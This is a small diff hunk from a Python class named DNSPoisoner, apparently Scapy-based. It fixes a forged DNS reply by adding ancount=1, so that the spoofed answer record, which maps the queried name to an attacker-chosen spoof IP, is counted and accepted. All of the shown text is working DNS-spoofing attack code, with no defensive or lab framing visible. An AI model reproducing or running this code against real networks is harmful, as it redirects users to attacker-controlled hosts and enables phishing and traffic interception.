@@ -29,7 +29,7 @@ class DNSPoisoner:
                         DNS(
                             id=pkt[DNS].id,
                             qr=1, aa=1, ra=1,
-                            qd=pkt[DNS].qd,
+                            qd=pkt[DNS].qd, ancount=1,
                             an=DNSRR(rrname=qname, ttl=300, rdata=self.spoof_ip)
                         )
                 )
